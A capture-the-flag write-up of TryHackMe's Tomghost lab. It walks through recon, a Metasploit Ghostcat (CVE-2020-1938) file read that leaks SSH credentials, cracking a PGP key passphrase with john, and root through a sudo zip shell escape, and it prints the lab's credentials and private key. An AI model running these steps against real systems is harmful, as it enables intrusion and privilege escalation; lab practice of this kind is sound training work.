# Tomghost

Notes on CTF. Run from TryHackMe's attack box.

The developer of this box used a swear word as a username, so don't read this writeup if that bothers you I suppose.

`10.10.153.220` is the target and `10.10.80.87` is the attackbox.

## Recon


### nmap
```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-11 17:56 BST
Nmap scan report for ip-10-10-153-220.eu-west-1.compute.internal (10.10.153.220)
Host is up (0.00054s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (EdDSA)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:F6:F9:B7:8F:A3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=7/11%OT=22%CT=1%CU=37225%PV=Y%DS=1%DC=D%G=Y%M=02F6F9%T
OS:M=64AD89CE%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=104%TI=Z%CI=I%TS=8
OS:)SEQ(SP=104%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms ip-10-10-153-220.eu-west-1.compute.internal (10.10.153.220)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.06 seconds
```

### gobuster
```
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.153.220:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/07/11 18:03:26 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
===============================================================
2023/07/11 18:04:22 Finished
===============================================================
```
manager denies access.

## Getting in

### Metasploit

https://www.exploit-db.com/exploits/49039
CVE-2020-1938 "Ghostcat"

`msf6 auxiliary(admin/http/tomcat_ghostcat) > show options`

```
Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL


View the full module info with the info, or info -d command.
```

`msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts 10.10.153.220`

`msf6 auxiliary(admin/http/tomcat_ghostcat) > run`

```
[*] Running module against 10.10.153.220
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1261-1583902632000"
Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
Content-Type: application/xml
Content-Length: 1261
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

[+] 10.10.153.220:8080 - /root/.msf4/loot/20230711182929_default_10.10.153.220_WEBINFweb.xml_115427.txt
[*] Auxiliary module execution completed
```

Credentials?
`skyfuck:8730281lkjlkjdqlksalks` 

This gets us into ssh.

### SSH

`root@ip-10-10-80-87:~# ssh skyfuck@10.10.153.220`

## Lateral escalation

skyfuck can't run sudo...

`skyfuck@ubuntu:~$ cat .bash_history` 
```
ls
cd ..
ls
cd skyfuck/
ls
exit
cd ..
ls
cd skyfuck/
ls
wget 192.168.32.23/tryhackme.asc
wget 192.168.32.23/credential.pgp
ls
exot
exit
```

`skyfuck@ubuntu:~$ cat tryhackme.asc`

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

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
kG6wLdznOpe4zaLA/vM=
=dMrv
-----END PGP PRIVATE KEY BLOCK-----
```

`skyfuck@ubuntu:~$ gpg --import tryhackme.asc`

``` 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
`skyfuck@ubuntu:~$ gpg --decrypt --output decrypted.txt credential.pgp`

```
You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)
```

### john

`skyfuck@ubuntu:~$ gpg --list-keys`

```
/home/skyfuck/.gnupg/pubring.gpg
--------------------------------
pub   3072D/C6707170 2020-03-11
uid                  tryhackme <stuxnet@tryhackme.com>
sub   1024g/6184FBCC 2020-03-11
```

`skyfuck@ubuntu:~$ gpg --export-secret-key --armor tryhackme > tryhackme.priv`

Transfer the file to the attackbox.
`skyfuck@ubuntu:~$ scp tryhackme.priv root@10.10.80.87:~`


`root@ip-10-10-80-87:~# gpg2john tryhackme.priv > gpghash`

`root@ip-10-10-80-87:~# john gpghash -wordlist=/usr/share/wordlists/rockyou.txt`

```
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2023-07-11 19:08) 5.263g/s 5642p/s 5642c/s 5642C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`skyfuck@ubuntu:~$ gpg --decrypt --output decrypted.txt credential.pgp` Now we can use `alexandru` to get the contents of `credential.pgp`.

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

in `/etc/passwd` we find:

```
merlin:x:1000:1000:zrimga,,,:/home/merlin:/bin/bash
```
So we can log into `merlin` with that long password (I thought for a second it was a hash, but noticed the repeating patterns...)

`/home/merlin` has `user.txt`


## Let's get to the root of things (haha)

### sudo

`merlin@ubuntu:/home/skyfuck$ sudo -l`

```
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

https://gtfobins.github.io/gtfobins/zip/
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

And that's it! We have root!
